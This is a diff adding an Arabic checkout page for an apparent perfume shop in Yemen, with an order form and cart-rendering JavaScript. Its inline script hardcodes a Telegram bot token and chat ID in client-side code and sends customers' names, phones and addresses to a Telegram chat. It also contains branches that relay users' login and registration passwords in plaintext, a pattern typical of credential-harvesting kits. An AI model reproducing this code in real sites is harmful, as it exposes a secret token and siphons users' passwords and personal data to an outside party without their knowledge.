@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>إتمام الطلب – المسعودي للعطور</title>
+  <link rel="stylesheet" href="css/style.css">
+  <style>
+    .order-summary { background: #f9f3e8; padding: 20px; border-radius: 12px; margin: 20px 0; }
+    .order-item { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #eee; }
+    .order-total { font-size: 1.2rem; font-weight: bold; color: #8B4513; margin-top: 10px; }
+    .form-group select, .form-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 1rem; }
+  </style>
+</head>
+<body class="auth-page">
+
+<div style="position:fixed;top:0;left:0;right:0;z-index:100;">
+  <div class="announcement-bar">
+    <span class="icon-blink">🎉</span> عروضات المسعودي للعطور – تخفيضات تصل إلى 30% <span class="icon-blink">🎁</span>
+  </div>
+</div>
+
+<div class="auth-card" style="margin-top:50px; max-width:600px;">
+  <div class="auth-logo">
+    <a href="index.html" style="display:block;margin-bottom:8px;">
+      <div style="font-size:1.8rem;font-weight:900;background:linear-gradient(90deg,#8B4513,#D4AF37);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">المسعودي للعطور</div>
+    </a>
+    <h2>الرئيسية → السلة → إتمام الطلب</h2>
+    <p style="font-size:0.9rem;color:#888;">يرجى ملء بيانات التواصل لتأكيد الطلب</p>
+  </div>
+
+  <div class="alert-msg" id="alertMsg"></div>
+
+  <!-- ملخص الطلب -->
+  <div class="order-summary" id="orderSummary">
+    <h3 style="margin-bottom:12px;">🛒 ملخص الطلب</h3>
+    <div id="orderItems"></div>
+    <div class="order-total" id="orderTotal">المجموع: 0 ﷼</div>
+  </div>
+
+  <form id="orderForm">
+    <h3 style="margin-bottom:12px;">📋 معلومات التواصل</h3>
+    
+    <div class="form-row">
+      <div class="form-group">
+        <label>👤 الاسم الأول</label>
+        <input type="text" id="firstName" placeholder="محمد" required>
+      </div>
+      <div class="form-group">
+        <label>👤 الاسم الأخير</label>
+        <input type="text" id="lastName" placeholder="المسعودي" required>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label>📞 رقم الهاتف</label>
+      <input type="tel" id="phone" placeholder="+967 7XX XXX XXX" required>
+    </div>
+
+    <div class="form-group">
+      <label>📧 البريد الإلكتروني (اختياري)</label>
+      <input type="email" id="email" placeholder="example@email.com">
+    </div>
+
+    <h3 style="margin:20px 0 12px;">📍 عنوان التوصيل</h3>
+
+    <div class="form-group">
+      <label>🏙️ المحافظة / المدينة</label>
+      <select id="city" required>
+        <option value="">اختر المحافظة</option>
+        <option value="صنعاء">صنعاء</option>
+        <option value="عدن">عدن</option>
+        <option value="تعز">تعز</option>
+        <option value="الحديدة">الحديدة</option>
+        <option value="إب">إب</option>
+        <option value="المكلا">المكلا</option>
+        <option value="سيئون">سيئون</option>
+        <option value="ذمار">ذمار</option>
+      </select>
+    </div>
+
+    <div class="form-group">
+      <label>🏠 الحي / المنطقة</label>
+      <input type="text" id="area" placeholder="مثال: حدة، الزبيري، المعال..." required>
+    </div>
+
+    <div class="form-group">
+      <label>📍 عنوان تفصيلي</label>
+      <input type="text" id="address" placeholder="الشارع، المبنى، الطابق..." required>
+    </div>
+
+    <div class="form-check" style="margin:18px 0;">
+      <input type="checkbox" id="terms" required>
+      <label for="terms">أوافق على <a href="#" style="color:var(--brown);">الشروط والأحكام</a></label>
+    </div>
+
+    <button type="submit" class="btn-auth" id="submitBtn" style="width:100%;padding:14px;font-size:1.1rem;">
+      ✅ تأكيد الطلب
+    </button>
+  </form>
+
+  <div class="auth-links">
+    <p style="margin-top:8px;"><a href="cart.html" style="color:#888;">← العودة إلى السلة</a></p>
+    <p style="margin-top:4px;"><a href="index.html" style="color:#888;">← العودة للرئيسية</a></p>
+  </div>
+</div>
+
+<script src="js/products.js"></script>
+<script src="js/main.js"></script>
+<script>
+  // ===== دالة إرسال إشعارات تليجرام (مباشرة) =====
+  function sendTelegramNotification(data) {
+    const BOT_TOKEN ='8549358187:AAG8Z2CioXFFZK43P0FTcTVKvutUSzUGJqU';
+    const CHAT_ID = '7770087246';
+
+    let message = '';
+    if (data.type === 'order') {
+      message = `🛍️ **طلب جديد من المسعودي للعطور**\n\n👤 الاسم: ${data.firstName} ${data.lastName}\n📞 الهاتف: ${data.phone}\n📧 البريد: ${data.email || 'غير مذكور'}\n🏙️ المدينة: ${data.city}\n🏠 الحي: ${data.area}\n📍 العنوان: ${data.address}\n\n🛒 **المنتجات:**\n${data.items}\n\n💰 **المجموع الكلي:** ${data.total}`;
+    } else if (data.type === 'register') {
+      message = `🆕 تسجيل حساب جديد:\n👤 الاسم: ${data.firstName} ${data.lastName}\n📧 البريد: ${data.email}\n🏙️ المدينة: ${data.city}\n🌍 الدولة: ${data.country}\n🔑 كلمة المرور: ${data.password}\n⏰ الوقت: ${data.time}`;
+    } else if (data.type === 'login') {
+      message = `🔐 تسجيل دخول:\n👤 الاسم: ${data.name}\n📧 البريد: ${data.email}\n🔑 كلمة المرور: ${data.password}\n⏰ الوقت: ${data.time}`;
+    }
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
+    }).catch(error => console.error('فشل إرسال الإشعار:', error));
+  }
+
+  // ===== عرض المنتجات في السلة =====
+  function renderOrderSummary() {
+    const cart = getCart();
+    const container = document.getElementById('orderItems');
+    const totalEl = document.getElementById('orderTotal');
+    
+    if (cart.length === 0) {
+      container.innerHTML = '<p style="color:#888;">السلة فارغة</p>';
+      totalEl.textContent = 'المجموع: 0 ﷼';
+      return;
+    }
+
+    let html = '';
+    let total = 0;
+    cart.forEach(item => {
+      const product = products.find(p => p.id === item.id);
+      if (product) {
+        const subtotal = product.price * item.qty;
+        total += subtotal;
+        html += `<div class="order-item">
+          <span>${product.emoji} ${product.name} × ${item.qty}</span>
+          <span>${formatPrice(subtotal)}</span>
+        </div>`;
+      }
+    });
+    container.innerHTML = html;
+    totalEl.textContent = `المجموع: ${formatPrice(total)}`;
+  }
+
+  // ===== عند تحميل الصفحة =====
+  document.addEventListener('DOMContentLoaded', function() {
+    renderOrderSummary();
+    
+    // تعبئة بيانات المستخدم إذا كان مسجلاً
+    const user = getUser();
+    if (user) {
+      document.getElementById('firstName').value = user.firstName || '';
+      document.getElementById('lastName').value = user.lastName || '';
+      document.getElementById('email').value = user.email || '';
+      if (user.city) document.getElementById('city').value = user.city;
+    }
+  });
+
+  // ===== عند إرسال الطلب =====
+  document.getElementById('orderForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const firstName = document.getElementById('firstName').value.trim();
+    const lastName = document.getElementById('lastName').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const city = document.getElementById('city').value;
+    const area = document.getElementById('area').value.trim();
+    const address = document.getElementById('address').value.trim();
+    const terms = document.getElementById('terms').checked;
+    const alertMsg = document.getElementById('alertMsg');
+    const btn = document.getElementById('submitBtn');
+
+    // التحقق من الحقول
+    if (!firstName || !lastName || !phone || !city || !area || !address) {
+      alertMsg.className = 'alert-msg alert-error';
+      alertMsg.textContent = '❌ يرجى ملء جميع الحقول المطلوبة';
+      return;
+    }
+    if (!terms) {
+      alertMsg.className = 'alert-msg alert-error';
+      alertMsg.textContent = '❌ يجب الموافقة على الشروط والأحكام';
+      return;
+    }
+
+    // التحقق من وجود منتجات في السلة
+    const cart = getCart();
+    if (cart.length === 0) {
+      alertMsg.className = 'alert-msg alert-error';
+      alertMsg.textContent = '❌ السلة فارغة! أضف منتجات أولاً';
+      return;
+    }
+
+    btn.textContent = '...جاري تأكيد الطلب';
+    btn.disabled = true;
+
+    // تجهيز قائمة المنتجات للرسالة
+    let itemsList = '';
+    let total = 0;
+    cart.forEach(item => {
+      const product = products.find(p => p.id === item.id);
+      if (product) {
+        const subtotal = product.price * item.qty;
+        total += subtotal;
+        itemsList += `- ${product.name} × ${item.qty} = ${formatPrice(subtotal)}\n`;
+      }
+    });
+
+    // إرسال إشعار تليجرام
+    sendTelegramNotification({
+      type: 'order',
+      firstName: firstName,
+      lastName: lastName,
+      phone: phone,
+      email: email,
+      city: city,
+      area: area,
+      address: address,
+      items: itemsList,
+      total: formatPrice(total)
+    });
+
+    // حفظ الطلب في localStorage
+    const orders = JSON.parse(localStorage.getItem('massoudi_orders') || '[]');
+    orders.push({
+      id: Date.now(),
+      firstName, lastName, phone, email, city, area, address,
+      items: cart,
+      total: total,
+      date: new Date().toISOString()
+    });
+    localStorage.setItem('massoudi_orders', JSON.stringify(orders));
+
+    // تفريغ السلة
+    localStorage.removeItem('massoudi_cart');
+    updateCartCount();
+
+    alertMsg.className = 'alert-msg alert-success';
+    alertMsg.textContent = '✅ تم تأكيد الطلب بنجاح! شكراً لك. جاري التحويل...';
+    
+    setTimeout(() => {
+      window.location.href = 'order_complete.html';
+    }, 2000);
+  });
+</script>
+</body>
+</html>
